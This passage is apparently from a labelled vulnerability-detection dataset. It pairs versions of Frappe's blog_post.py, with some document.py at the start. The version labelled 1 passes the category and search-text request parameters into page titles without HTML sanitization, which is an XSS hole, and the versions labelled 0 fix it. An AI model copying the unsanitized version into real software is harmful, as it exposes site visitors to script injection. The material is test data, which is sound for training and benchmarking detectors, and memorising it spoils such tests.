df.get(\"options\")!=\"Email\")\n\t\t\t\t\t\tor df.get(\"fieldtype\") in (\"Attach\", \"Attach Image\")\n\n\t\t\t\t\t\t# cancelled and submit but not update after submit should be ignored\n\t\t\t\t\t\tor self.docstatus==2\n\t\t\t\t\t\tor (self.docstatus==1 and not df.get(\"allow_on_submit\"))):\n\t\t\t\tcontinue\n\n\t\t\telse:\n\t\t\t\tsanitized_value = sanitize_html(value, linkify=df.fieldtype=='Text Editor')\n\n\t\t\tself.set(fieldname, sanitized_value)\n\n\tdef _save_passwords(self):\n\t\t'''Save password field values in __Auth table'''\n\t\tif self.flags.ignore_save_passwords is True:\n\t\t\treturn\n\n\t\tfor df in self.meta.get('fields', {'fieldtype': ('=', 'Password')}):\n\t\t\tif self.flags.ignore_save_passwords and df.fieldname in self.flags.ignore_save_passwords: continue\n\t\t\tnew_password = self.get(df.fieldname)\n\t\t\tif new_password and not self.is_dummy_password(new_password):\n\t\t\t\t# is not a dummy password like '*****'\n\t\t\t\tset_encrypted_password(self.doctype, self.name, new_password, df.fieldname)\n\n\t\t\t\t# set dummy password like '*****'\n\t\t\t\tself.set(df.fieldname, '*'*len(new_password))\n\n\tdef get_password(self, fieldname='password', raise_exception=True):\n\t\tif self.get(fieldname) and not self.is_dummy_password(self.get(fieldname)):\n\t\t\treturn self.get(fieldname)\n\n\t\treturn get_decrypted_password(self.doctype, self.name, fieldname, raise_exception=raise_exception)\n\n\tdef is_dummy_password(self, pwd):\n\t\treturn ''.join(set(pwd))=='*'\n\n\tdef precision(self, fieldname, parentfield=None):\n\t\t\"\"\"Returns float precision for a particular field (or get global default).\n\n\t\t:param fieldname: Fieldname for which precision is required.\n\t\t:param parentfield: If fieldname is in child table.\"\"\"\n\t\tfrom frappe.model.meta import get_field_precision\n\n\t\tif parentfield and not isinstance(parentfield, string_types):\n\t\t\tparentfield = parentfield.parentfield\n\n\t\tcache_key = parentfield or \"main\"\n\n\t\tif not hasattr(self, \"_precision\"):\n\t\t\tself._precision = frappe._dict()\n\n\t\tif cache_key not in self._precision:\n\t\t\tself._precision[cache_key] = frappe._dict()\n\n\t\tif fieldname not in self._precision[cache_key]:\n\t\t\tself._precision[cache_key][fieldname] = None\n\n\t\t\tdoctype = self.meta.get_field(parentfield).options if parentfield else self.doctype\n\t\t\tdf = frappe.get_meta(doctype).get_field(fieldname)\n\n\t\t\tif df.fieldtype in (\"Currency\", \"Float\", \"Percent\"):\n\t\t\t\tself._precision[cache_key][fieldname] = get_field_precision(df, self)\n\n\t\treturn self._precision[cache_key][fieldname]\n\n\n\tdef get_formatted(self, fieldname, doc=None, currency=None, absolute_value=False, translated=False):\n\t\tfrom frappe.utils.formatters import format_value\n\n\t\tdf = self.meta.get_field(fieldname)\n\t\tif not df and fieldname in default_fields:\n\t\t\tfrom frappe.model.meta import get_default_df\n\t\t\tdf = get_default_df(fieldname)\n\n\t\tval = self.get(fieldname)\n\n\t\tif translated:\n\t\t\tval = _(val)\n\n\t\tif absolute_value and isinstance(val, (int, float)):\n\t\t\tval = abs(self.get(fieldname))\n\n\t\tif not doc:\n\t\t\tdoc = getattr(self, \"parent_doc\", None) or self\n\n\t\treturn format_value(val, df=df, doc=doc, currency=currency)\n\n\tdef is_print_hide(self, fieldname, df=None, for_print=True):\n\t\t\"\"\"Returns true if fieldname is to be hidden for print.\n\n\t\tPrint Hide can be set via the Print Format Builder or in the controller as a list\n\t\tof hidden fields. Example\n\n\t\t\tclass MyDoc(Document):\n\t\t\t\tdef __setup__(self):\n\t\t\t\t\tself.print_hide = [\"field1\", \"field2\"]\n\n\t\t:param fieldname: Fieldname to be checked if hidden.\n\t\t\"\"\"\n\t\tmeta_df = self.meta.get_field(fieldname)\n\t\tif meta_df and meta_df.get(\"__print_hide\"):\n\t\t\treturn True\n\n\t\tprint_hide = 0\n\n\t\tif self.get(fieldname)==0 and not self.meta.istable:\n\t\t\tprint_hide = ( df and df.print_hide_if_no_value ) or ( meta_df and meta_df.print_hide_if_no_value )\n\n\t\tif not print_hide:\n\t\t\tif df and df.print_hide is not None:\n\t\t\t\tprint_hide = df.print_hide\n\t\t\telif meta_df:\n\t\t\t\tprint_hide = meta_df.print_hide\n\n\t\treturn print_hide\n\n\tdef in_format_data(self, fieldname):\n\t\t\"\"\"Returns True if shown via Print Format::`format_data` property.\n\t\t\tCalled from within standard print format.\"\"\"\n\t\tdoc = getattr(self, \"parent_doc\", self)\n\n\t\tif hasattr(doc, \"format_data_map\"):\n\t\t\treturn fieldname in doc.format_data_map\n\t\telse:\n\t\t\treturn True\n\n\tdef reset_values_if_no_permlevel_access(self, has_access_to, high_permlevel_fields):\n\t\t\"\"\"If the user does not have permissions at permlevel > 0, then reset the values to original / default\"\"\"\n\t\tto_reset = []\n\n\t\tfor df in high_permlevel_fields:\n\t\t\tif df.permlevel not in has_access_to and df.fieldtype not in display_fieldtypes:\n\t\t\t\tto_reset.append(df)\n\n\t\tif to_reset:\n\t\t\tif self.is_new():\n\t\t\t\t# if new, set default value\n\t\t\t\tref_doc = frappe.new_doc(self.doctype)\n\t\t\telse:\n\t\t\t\t# get values from old doc\n\t\t\t\tif self.get('parent_doc'):\n\t\t\t\t\tself.parent_doc.get_latest()\n\t\t\t\t\tref_doc = [d for d in self.parent_doc.get(self.parentfield) if d.name == self.name][0]\n\t\t\t\telse:\n\t\t\t\t\tref_doc = self.get_latest()\n\n\t\t\tfor df in to_reset:\n\t\t\t\tself.set(df.fieldname, ref_doc.get(df.fieldname))\n\n\tdef get_value(self, fieldname):\n\t\tdf = self.meta.get_field(fieldname)\n\t\tval = self.get(fieldname)\n\n\t\treturn self.cast(val, df)\n\n\tdef cast(self, value, df):\n\t\treturn cast_fieldtype(df.fieldtype, value)\n\n\tdef _extract_images_from_text_editor(self):\n\t\tfrom frappe.utils.file_manager import extract_images_from_doc\n\t\tif self.doctype != \"DocType\":\n\t\t\tfor df in self.meta.get(\"fields\", {\"fieldtype\": ('=', \"Text Editor\")}):\n\t\t\t\textract_images_from_doc(self, df.fieldname)\n\ndef _filter(data, filters, limit=None):\n\t\"\"\"pass filters as:\n\t\t{\"key\": \"val\", \"key\": [\"!=\", \"val\"],\n\t\t\"key\": [\"in\", \"val\"], \"key\": [\"not in\", \"val\"], \"key\": \"^val\",\n\t\t\"key\" : True (exists), \"key\": False (does not exist) }\"\"\"\n\n\tout, _filters = [], {}\n\n\tif not data:\n\t\treturn out\n\n\t# setup filters as tuples\n\tif filters:\n\t\tfor f in filters:\n\t\t\tfval = filters[f]\n\n\t\t\tif not isinstance(fval, (tuple, list)):\n\t\t\t\tif fval is True:\n\t\t\t\t\tfval = (\"not None\", fval)\n\t\t\t\telif fval is False:\n\t\t\t\t\tfval = (\"None\", fval)\n\t\t\t\telif isinstance(fval, string_types) and fval.startswith(\"^\"):\n\t\t\t\t\tfval = (\"^\", fval[1:])\n\t\t\t\telse:\n\t\t\t\t\tfval = (\"=\", fval)\n\n\t\t\t_filters[f] = fval\n\n\tfor d in data:\n\t\tadd = True\n\t\tfor f, fval in iteritems(_filters):\n\t\t\tif not frappe.compare(getattr(d, f, None), fval[0], fval[1]):\n\t\t\t\tadd = False\n\t\t\t\tbreak\n\n\t\tif add:\n\t\t\tout.append(d)\n\t\t\tif limit and (len(out)-1)==limit:\n\t\t\t\tbreak\n\n\treturn out\n/n/n/n", "label": 1}, {"id": "2fa19c25066ed17478d683666895e3266936aee6", "code": "frappe/website/doctype/blog_post/blog_post.py/n/n# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors\n# MIT License. See license.txt\n\nfrom __future__ import unicode_literals\n\nimport frappe\nfrom frappe import _\nfrom frappe.website.website_generator import WebsiteGenerator\nfrom frappe.website.render import clear_cache\nfrom frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown, sanitize_html\nfrom frappe.website.utils import find_first_image, get_comment_list\n\nclass BlogPost(WebsiteGenerator):\n\twebsite = frappe._dict(\n\t\torder_by = \"published_on desc\"\n\t)\n\n\tdef make_route(self):\n\t\tif not self.route:\n\t\t\treturn frappe.db.get_value('Blog Category', self.blog_category,\n\t\t\t\t'route') + '/' + self.scrub(self.title)\n\n\tdef get_feed(self):\n\t\treturn self.title\n\n\tdef validate(self):\n\t\tsuper(BlogPost, self).validate()\n\n\t\tif not self.blog_intro:\n\t\t\tself.blog_intro = self.content[:140]\n\t\t\tself.blog_intro = strip_html_tags(self.blog_intro)\n\n\t\tif self.blog_intro:\n\t\t\tself.blog_intro = self.blog_intro[:140]\n\n\t\tif self.published and not self.published_on:\n\t\t\tself.published_on = today()\n\n\t\t# update posts\n\t\tfrappe.db.sql(\"\"\"update tabBlogger set posts=(select count(*) from `tabBlog Post`\n\t\t\twhere ifnull(blogger,'')=tabBlogger.name)\n\t\t\twhere name=%s\"\"\", (self.blogger,))\n\n\tdef on_update(self):\n\t\tclear_cache(\"writers\")\n\n\tdef get_context(self, context):\n\t\t# this is for double precaution. usually it wont reach this code if not published\n\t\tif not cint(self.published):\n\t\t\traise Exception(\"This blog has not been published yet!\")\n\n\t\t# temp fields\n\t\tcontext.full_name = get_fullname(self.owner)\n\t\tcontext.updated = global_date_format(self.published_on)\n\n\t\tif self.blogger:\n\t\t\tcontext.blogger_info = frappe.get_doc(\"Blogger\", self.blogger).as_dict()\n\n\t\tcontext.description = self.blog_intro or self.content[:140]\n\n\t\tcontext.metatags = {\n\t\t\t\"name\": self.title,\n\t\t\t\"description\": context.description,\n\t\t}\n\n\t\tif \"<!-- markdown -->\" in context.content:\n\t\t\tcontext.content = markdown(context.content)\n\n\t\timage = find_first_image(self.content)\n\t\tif image:\n\t\t\tcontext.metatags[\"image\"] = image\n\n\t\tcontext.comment_list = get_comment_list(self.doctype, self.name)\n\t\tif not context.comment_list:\n\t\t\tcontext.comment_text = _('No comments yet')\n\t\telse:\n\t\t\tif(len(context.comment_list)) == 1:\n\t\t\t\tcontext.comment_text = _('1 comment')\n\t\t\telse:\n\t\t\t\tcontext.comment_text = _('{0} comments').format(len(context.comment_list))\n\n\t\tcontext.category = frappe.db.get_value(\"Blog Category\",\n\t\t\tcontext.doc.blog_category, [\"title\", \"route\"], as_dict=1)\n\t\tcontext.parents = [{\"name\": _(\"Home\"), \"route\":\"/\"},\n\t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"},\n\t\t\t{\"label\": context.category.title, \"route\":context.category.route}]\n\ndef get_list_context(context=None):\n\tlist_context = frappe._dict(\n\t\ttemplate = \"templates/includes/blog/blog.html\",\n\t\tget_list = get_blog_list,\n\t\thide_filters = True,\n\t\tchildren = get_children(),\n\t\t# show_search = True,\n\t\ttitle = _('Blog')\n\t)\n\n\tcategory = sanitize_html(frappe.local.form_dict.blog_category or frappe.local.form_dict.category)\n\tif category:\n\t\tcategory_title = get_blog_category(category)\n\t\tlist_context.sub_title = _(\"Posts filed under {0}\").format(category_title)\n\t\tlist_context.title = category_title\n\n\telif frappe.local.form_dict.blogger:\n\t\tblogger = frappe.db.get_value(\"Blogger\", {\"name\": frappe.local.form_dict.blogger}, \"full_name\")\n\t\tlist_context.sub_title = _(\"Posts by {0}\").format(blogger)\n\t\tlist_context.title = blogger\n\n\telif frappe.local.form_dict.txt:\n\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(sanitize_html(frappe.local.form_dict.txt))\n\n\tif list_context.sub_title:\n\t\tlist_context.parents = [{\"name\": _(\"Home\"), \"route\": \"/\"},\n\t\t\t\t\t\t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"}]\n\telse:\n\t\tlist_context.parents = [{\"name\": _(\"Home\"), \"route\": \"/\"}]\n\n\tlist_context.update(frappe.get_doc(\"Blog Settings\", \"Blog Settings\").as_dict(no_default_fields=True))\n\treturn list_context\n\ndef get_children():\n\treturn frappe.db.sql(\"\"\"select route as name,\n\t\ttitle from `tabBlog Category`\n\t\twhere published = 1\n\t\tand exists (select name from `tabBlog Post`\n\t\t\twhere `tabBlog Post`.blog_category=`tabBlog Category`.name and published=1)\n\t\torder by title asc\"\"\", as_dict=1)\n\ndef clear_blog_cache():\n\tfor blog in frappe.db.sql_list(\"\"\"select route from\n\t\t`tabBlog Post` where ifnull(published,0)=1\"\"\"):\n\t\tclear_cache(blog)\n\n\tclear_cache(\"writers\")\n\ndef get_blog_category(route):\n\treturn frappe.db.get_value(\"Blog Category\", {\"name\": route}, \"title\") or route\n\ndef get_blog_list(doctype, txt=None, filters=None, limit_start=0, limit_page_length=20, order_by=None):\n\tconditions = []\n\tif filters:\n\t\tif filters.blogger:\n\t\t\tconditions.append('t1.blogger=\"%s\"' % frappe.db.escape(filters.blogger))\n\t\tif filters.blog_category:\n\t\t\tconditions.append('t1.blog_category=\"%s\"' % frappe.db.escape(filters.blog_category))\n\n\tif txt:\n\t\tconditions.append('(t1.content like \"%{0}%\" or t1.title like \"%{0}%\")'.format(frappe.db.escape(txt)))\n\n\tif conditions:\n\t\tfrappe.local.no_cache = 1\n\n\tquery = \"\"\"\\\n\t\tselect\n\t\t\tt1.title, t1.name, t1.blog_category, t1.route, t1.published_on,\n\t\t\t\tt1.published_on as creation,\n\t\t\t\tt1.content as content,\n\t\t\t\tifnull(t1.blog_intro, t1.content) as intro,\n\t\t\t\tt2.full_name, t2.avatar, t1.blogger,\n\t\t\t\t(select count(name) from `tabCommunication`\n\t\t\t\t\twhere\n\t\t\t\t\t\tcommunication_type='Comment'\n\t\t\t\t\t\tand comment_type='Comment'\n\t\t\t\t\t\tand reference_doctype='Blog Post'\n\t\t\t\t\t\tand reference_name=t1.name) as comments\n\t\tfrom `tabBlog Post` t1, `tabBlogger` t2\n\t\twhere ifnull(t1.published,0)=1\n\t\tand t1.blogger = t2.name\n\t\t%(condition)s\n\t\torder by published_on desc, name asc\n\t\tlimit %(start)s, %(page_len)s\"\"\" % {\n\t\t\t\"start\": limit_start, \"page_len\": limit_page_length,\n\t\t\t\t\"condition\": (\" and \" + \" and \".join(conditions)) if conditions else \"\"\n\t\t}\n\n\tposts = frappe.db.sql(query, as_dict=1)\n\n\tfor post in posts:\n\t\tpost.cover_image = find_first_image(post.content)\n\t\tpost.published = global_date_format(post.creation)\n\t\tpost.content = strip_html_tags(post.content[:340])\n\t\tif not post.comments:\n\t\t\tpost.comment_text = _('No comments yet')\n\t\telif post.comments==1:\n\t\t\tpost.comment_text = _('1 comment')\n\t\telse:\n\t\t\tpost.comment_text = _('{0} comments').format(str(post.comments))\n\n\t\tpost.avatar = post.avatar or \"\"\n\t\tpost.category = frappe.db.get_value('Blog Category', post.blog_category,\n\t\t\t['route', 'title'], as_dict=True)\n\n\t\tif post.avatar and (not \"http:\" in post.avatar and not \"https:\" in post.avatar) and not post.avatar.startswith(\"/\"):\n\t\t\tpost.avatar = \"/\" + post.avatar\n\n\treturn posts\n/n/n/n", "label": 0}, {"id": "2fa19c25066ed17478d683666895e3266936aee6", "code": "/frappe/website/doctype/blog_post/blog_post.py/n/n# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors\n# MIT License. See license.txt\n\nfrom __future__ import unicode_literals\n\nimport frappe\nfrom frappe import _\nfrom frappe.website.website_generator import WebsiteGenerator\nfrom frappe.website.render import clear_cache\nfrom frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown\nfrom frappe.website.utils import find_first_image, get_comment_list\n\nclass BlogPost(WebsiteGenerator):\n\twebsite = frappe._dict(\n\t\torder_by = \"published_on desc\"\n\t)\n\n\tdef make_route(self):\n\t\tif not self.route:\n\t\t\treturn frappe.db.get_value('Blog Category', self.blog_category,\n\t\t\t\t'route') + '/' + self.scrub(self.title)\n\n\tdef get_feed(self):\n\t\treturn self.title\n\n\tdef validate(self):\n\t\tsuper(BlogPost, self).validate()\n\n\t\tif not self.blog_intro:\n\t\t\tself.blog_intro = self.content[:140]\n\t\t\tself.blog_intro = strip_html_tags(self.blog_intro)\n\n\t\tif self.blog_intro:\n\t\t\tself.blog_intro = self.blog_intro[:140]\n\n\t\tif self.published and not self.published_on:\n\t\t\tself.published_on = today()\n\n\t\t# update posts\n\t\tfrappe.db.sql(\"\"\"update tabBlogger set posts=(select count(*) from `tabBlog Post`\n\t\t\twhere ifnull(blogger,'')=tabBlogger.name)\n\t\t\twhere name=%s\"\"\", (self.blogger,))\n\n\tdef on_update(self):\n\t\tclear_cache(\"writers\")\n\n\tdef get_context(self, context):\n\t\t# this is for double precaution. usually it wont reach this code if not published\n\t\tif not cint(self.published):\n\t\t\traise Exception(\"This blog has not been published yet!\")\n\n\t\t# temp fields\n\t\tcontext.full_name = get_fullname(self.owner)\n\t\tcontext.updated = global_date_format(self.published_on)\n\n\t\tif self.blogger:\n\t\t\tcontext.blogger_info = frappe.get_doc(\"Blogger\", self.blogger).as_dict()\n\n\t\tcontext.description = self.blog_intro or self.content[:140]\n\n\t\tcontext.metatags = {\n\t\t\t\"name\": self.title,\n\t\t\t\"description\": context.description,\n\t\t}\n\n\t\tif \"<!-- markdown -->\" in context.content:\n\t\t\tcontext.content = markdown(context.content)\n\n\t\timage = find_first_image(self.content)\n\t\tif image:\n\t\t\tcontext.metatags[\"image\"] = image\n\n\t\tcontext.comment_list = get_comment_list(self.doctype, self.name)\n\t\tif not context.comment_list:\n\t\t\tcontext.comment_text = _('No comments yet')\n\t\telse:\n\t\t\tif(len(context.comment_list)) == 1:\n\t\t\t\tcontext.comment_text = _('1 comment')\n\t\t\telse:\n\t\t\t\tcontext.comment_text = _('{0} comments').format(len(context.comment_list))\n\n\t\tcontext.category = frappe.db.get_value(\"Blog Category\",\n\t\t\tcontext.doc.blog_category, [\"title\", \"route\"], as_dict=1)\n\t\tcontext.parents = [{\"name\": _(\"Home\"), \"route\":\"/\"},\n\t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"},\n\t\t\t{\"label\": context.category.title, \"route\":context.category.route}]\n\ndef get_list_context(context=None):\n\tlist_context = frappe._dict(\n\t\ttemplate = \"templates/includes/blog/blog.html\",\n\t\tget_list = get_blog_list,\n\t\thide_filters = True,\n\t\tchildren = get_children(),\n\t\t# show_search = True,\n\t\ttitle = _('Blog')\n\t)\n\n\tcategory = frappe.local.form_dict.blog_category or frappe.local.form_dict.category\n\tif category:\n\t\tcategory_title = get_blog_category(category)\n\t\tlist_context.sub_title = _(\"Posts filed under {0}\").format(category_title)\n\t\tlist_context.title = category_title\n\n\telif frappe.local.form_dict.blogger:\n\t\tblogger = frappe.db.get_value(\"Blogger\", {\"name\": frappe.local.form_dict.blogger}, \"full_name\")\n\t\tlist_context.sub_title = _(\"Posts by {0}\").format(blogger)\n\t\tlist_context.title = blogger\n\n\telif frappe.local.form_dict.txt:\n\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(frappe.local.form_dict.txt)\n\n\tif list_context.sub_title:\n\t\tlist_context.parents = [{\"name\": _(\"Home\"), \"route\": \"/\"},\n\t\t\t\t\t\t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"}]\n\telse:\n\t\tlist_context.parents = [{\"name\": _(\"Home\"), \"route\": \"/\"}]\n\n\tlist_context.update(frappe.get_doc(\"Blog Settings\", \"Blog Settings\").as_dict(no_default_fields=True))\n\treturn list_context\n\ndef get_children():\n\treturn frappe.db.sql(\"\"\"select route as name,\n\t\ttitle from `tabBlog Category`\n\t\twhere published = 1\n\t\tand exists (select name from `tabBlog Post`\n\t\t\twhere `tabBlog Post`.blog_category=`tabBlog Category`.name and published=1)\n\t\torder by title asc\"\"\", as_dict=1)\n\ndef clear_blog_cache():\n\tfor blog in frappe.db.sql_list(\"\"\"select route from\n\t\t`tabBlog Post` where ifnull(published,0)=1\"\"\"):\n\t\tclear_cache(blog)\n\n\tclear_cache(\"writers\")\n\ndef get_blog_category(route):\n\treturn frappe.db.get_value(\"Blog Category\", {\"name\": route}, \"title\") or route\n\ndef get_blog_list(doctype, txt=None, filters=None, limit_start=0, limit_page_length=20, order_by=None):\n\tconditions = []\n\tif filters:\n\t\tif filters.blogger:\n\t\t\tconditions.append('t1.blogger=\"%s\"' % frappe.db.escape(filters.blogger))\n\t\tif filters.blog_category:\n\t\t\tconditions.append('t1.blog_category=\"%s\"' % frappe.db.escape(filters.blog_category))\n\n\tif txt:\n\t\tconditions.append('(t1.content like \"%{0}%\" or t1.title like \"%{0}%\")'.format(frappe.db.escape(txt)))\n\n\tif conditions:\n\t\tfrappe.local.no_cache = 1\n\n\tquery = \"\"\"\\\n\t\tselect\n\t\t\tt1.title, t1.name, t1.blog_category, t1.route, t1.published_on,\n\t\t\t\tt1.published_on as creation,\n\t\t\t\tt1.content as content,\n\t\t\t\tifnull(t1.blog_intro, t1.content) as intro,\n\t\t\t\tt2.full_name, t2.avatar, t1.blogger,\n\t\t\t\t(select count(name) from `tabCommunication`\n\t\t\t\t\twhere\n\t\t\t\t\t\tcommunication_type='Comment'\n\t\t\t\t\t\tand comment_type='Comment'\n\t\t\t\t\t\tand reference_doctype='Blog Post'\n\t\t\t\t\t\tand reference_name=t1.name) as comments\n\t\tfrom `tabBlog Post` t1, `tabBlogger` t2\n\t\twhere ifnull(t1.published,0)=1\n\t\tand t1.blogger = t2.name\n\t\t%(condition)s\n\t\torder by published_on desc, name asc\n\t\tlimit %(start)s, %(page_len)s\"\"\" % {\n\t\t\t\"start\": limit_start, \"page_len\": limit_page_length,\n\t\t\t\t\"condition\": (\" and \" + \" and \".join(conditions)) if conditions else \"\"\n\t\t}\n\n\tposts = frappe.db.sql(query, as_dict=1)\n\n\tfor post in posts:\n\t\tpost.cover_image = find_first_image(post.content)\n\t\tpost.published = global_date_format(post.creation)\n\t\tpost.content = strip_html_tags(post.content[:340])\n\t\tif not post.comments:\n\t\t\tpost.comment_text = _('No comments yet')\n\t\telif post.comments==1:\n\t\t\tpost.comment_text = _('1 comment')\n\t\telse:\n\t\t\tpost.comment_text = _('{0} comments').format(str(post.comments))\n\n\t\tpost.avatar = post.avatar or \"\"\n\t\tpost.category = frappe.db.get_value('Blog Category', post.blog_category,\n\t\t\t['route', 'title'], as_dict=True)\n\n\t\tif post.avatar and (not \"http:\" in post.avatar and not \"https:\" in post.avatar) and not post.avatar.startswith(\"/\"):\n\t\t\tpost.avatar = \"/\" + post.avatar\n\n\treturn posts\n/n/n/n", "label": 1}, {"id": "2fa19c25066ed17478d683666895e3266936aee6", "code": "frappe/website/doctype/blog_post/blog_post.py/n/n# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors\n# MIT License. See license.txt\n\nfrom __future__ import unicode_literals\n\nimport frappe\nfrom frappe import _\nfrom frappe.website.website_generator import WebsiteGenerator\nfrom frappe.website.render import clear_cache\nfrom frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown, sanitize_html\nfrom frappe.website.utils import find_first_image, get_comment_list\n\nclass BlogPost(WebsiteGenerator):\n\twebsite = frappe._dict(\n\t\torder_by = \"published_on desc\"\n\t)\n\n\tdef make_route(self):\n\t\tif not self.route:\n\t\t\treturn frappe.db.get_value('Blog Category', self.blog_category,\n\t\t\t\t'route') + '/' + self.scrub(self.title)\n\n\tdef get_feed(self):\n\t\treturn self.title\n\n\tdef validate(self):\n\t\tsuper(BlogPost, self).validate()\n\n\t\tif not self.blog_intro:\n\t\t\tself.blog_intro = self.content[:140]\n\t\t\tself.blog_intro = strip_html_tags(self.blog_intro)\n\n\t\tif self.blog_intro:\n\t\t\tself.blog_intro = self.blog_intro[:140]\n\n\t\tif self.published and not self.published_on:\n\t\t\tself.published_on = today()\n\n\t\t# update posts\n\t\tfrappe.db.sql(\"\"\"update tabBlogger set posts=(select count(*) from `tabBlog Post`\n\t\t\twhere ifnull(blogger,'')=tabBlogger.name)\n\t\t\twhere name=%s\"\"\", (self.blogger,))\n\n\tdef on_update(self):\n\t\tclear_cache(\"writers\")\n\n\tdef get_context(self, context):\n\t\t# this is for double precaution. usually it wont reach this code if not published\n\t\tif not cint(self.published):\n\t\t\traise Exception(\"This blog has not been published yet!\")\n\n\t\t# temp fields\n\t\tcontext.full_name = get_fullname(self.owner)\n\t\tcontext.updated = global_date_format(self.published_on)\n\n\t\tif self.blogger:\n\t\t\tcontext.blogger_info = frappe.get_doc(\"Blogger\", self.blogger).as_dict()\n\n\t\tcontext.description = self.blog_intro or self.content[:140]\n\n\t\tcontext.metatags = {\n\t\t\t\"name\": self.title,\n\t\t\t\"description\": context.description,\n\t\t}\n\n\t\tif \"<!-- markdown -->\" in context.content:\n\t\t\tcontext.content = markdown(context.content)\n\n\t\timage = find_first_image(self.content)\n\t\tif image:\n\t\t\tcontext.metatags[\"image\"] = image\n\n\t\tcontext.comment_list = get_comment_list(self.doctype, self.name)\n\t\tif not context.comment_list:\n\t\t\tcontext.comment_text = _('No comments yet')\n\t\telse:\n\t\t\tif(len(context.comment_list)) == 1:\n\t\t\t\tcontext.comment_text = _('1 comment')\n\t\t\telse:\n\t\t\t\tcontext.comment_text = _('{0} comments').format(len(context.comment_list))\n\n\t\tcontext.category = frappe.db.get_value(\"Blog Category\",\n\t\t\tcontext.doc.blog_category, [\"title\", \"route\"], as_dict=1)\n\t\tcontext.parents = [{\"name\": _(\"Home\"), \"route\":\"/\"},\n\t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"},\n\t\t\t{\"label\": context.category.title, \"route\":context.category.route}]\n\ndef get_list_context(context=None):\n\tlist_context = frappe._dict(\n\t\ttemplate = \"templates/includes/blog/blog.html\",\n\t\tget_list = get_blog_list,\n\t\thide_filters = True,\n\t\tchildren = get_children(),\n\t\t# show_search = True,\n\t\ttitle = _('Blog')\n\t)\n\n\tcategory = sanitize_html(frappe.local.form_dict.blog_category or frappe.local.form_dict.category)\n\tif category:\n\t\tcategory_title = get_blog_category(category)\n\t\tlist_context.sub_title = _(\"Posts filed under {0}\").format(category_title)\n\t\tlist_context.title = category_title\n\n\telif frappe.local.form_dict.blogger:\n\t\tblogger = frappe.db.get_value(\"Blogger\", {\"name\": frappe.local.form_dict.blogger}, \"full_name\")\n\t\tlist_context.sub_title = _(\"Posts by {0}\").format(blogger)\n\t\tlist_context.title = blogger\n\n\telif frappe.local.form_dict.txt:\n\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(sanitize_html(frappe.local.form_dict.txt))\n\n\tif list_context.sub_title:\n\t\tlist_context.parents = [{\"name\": _(\"Home\"), \"route\": \"/\"},\n\t\t\t\t\t\t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"}]\n\telse:\n\t\tlist_context.parents = [{\"name\": _(\"Home\"), \"route\": \"/\"}]\n\n\tlist_context.update(frappe.get_doc(\"Blog Settings\", \"Blog Settings\").as_dict(no_default_fields=True))\n\treturn list_context\n\ndef get_children():\n\treturn frappe.db.sql(\"\"\"select route as name,\n\t\ttitle from `tabBlog Category`\n\t\twhere published = 1\n\t\tand exists (select name from `tabBlog Post`\n\t\t\twhere `tabBlog Post`.blog_category=`tabBlog Category`.name and published=1)\n\t\torder by title asc\"\"\", as_dict=1)\n\ndef clear_blog_cache():\n\tfor blog in frappe.db.sql_list(\"\"\"select route from\n\t\t`tabBlog Post` where ifnull(published,0)=1\"\"\"):\n\t\tclear_cache(blog)\n\n\tclear_cache(\"writers\")\n\ndef get_blog_category(route):\n\treturn frappe.db.get_value(\"Blog Category\", {\"name\": route}, \"title\") or route\n\ndef get_blog_list(doctype, txt=None, filters=None, limit_start=0, limit_page_length=20, order_by=None):\n\tconditions = []\n\tif filters:\n\t\tif filters.blogger:\n\t\t\tconditions.append('t1.blogger=\"%s\"' % frappe.db.escape(filters.blogger))\n\t\tif filters.blog_category:\n\t\t\tconditions.append('t1.blog_category=\"%s\"' % frappe.db.escape(filters.blog_category))\n\n\tif txt:\n\t\tconditions.append('(t1.content like \"%{0}%\" or t1.title like \"%{0}%\")'.format(frappe.db.escape(txt)))\n\n\tif conditions:\n\t\tfrappe.local.no_cache = 1\n\n\tquery = \"\"\"\\\n\t\tselect\n\t\t\tt1.title, t1.name, t1.blog_category, t1.route, t1.published_on,\n\t\t\t\tt1.published_on as creation,\n\t\t\t\tt1.content as content,\n\t\t\t\tifnull(t1.blog_intro, t1.content) as intro,\n\t\t\t\tt2.full_name, t2.avatar, t1.blogger,\n\t\t\t\t(select count(name) from `tabCommunication`\n\t\t\t\t\twhere\n\t\t\t\t\t\tcommunication_type='Comment'\n\t\t\t\t\t\tand comment_type='Comment'\n\t\t\t\t\t\tand reference_doctype='Blog Post'\n\t\t\t\t\t\tand reference_name=t1.name) as comments\n\t\tfrom `tabBlog Post` t1, `tabBlogger` t2\n\t\twhere ifnull(t1.published,0)=1\n\t\tand t1.blogger = t2.name\n\t\t%(condition)s\n\t\torder by published_on desc, name asc\n\t\tlimit %(start)s, %(page_len)s\"\"\" % {\n\t\t\t\"start\": limit_start, \"page_len\": limit_page_length,\n\t\t\t\t\"condition\": (\" and \" + \" and \".join(conditions)) if conditions else \"\"\n\t\t}\n\n\tposts = frappe.db.sql(query, as_dict=1)\n\n\tfor post in posts:\n\t\tpost.cover_image = find_first_image(post.content)\n\t\tpost.published = global_date_format(post.creation)\n\t\tpost.content = strip_html_tags(post.content[:340])\n\t\tif not post.comments:\n\t\t\tpost.comment_text = _('No comments yet')\n\t\telif post.comments==1:\n\t\t\tpost.comment_text = _('1 comment')\n\t\telse:\n\t\t\tpost.comment_text = _('{0} comments').format(str(post.comments))\n\n\t\tpost.avatar = post.avatar or \"\"\n\t\tpost.category = frappe.db.get_value('Blog Category', post.blog_category,\n\t\t\t['route', 'title'], as_dict=True)\n\n\t\tif post.avatar and (not \"http:\" in post.avatar and not \"https:\" in post.avatar) and not post.avatar.startswith(\"/\"):\n\t\t\tpost.avatar = \"/\" + post.avatar\n\n\treturn posts\n/n/n/n", "label": 0}, {"id": 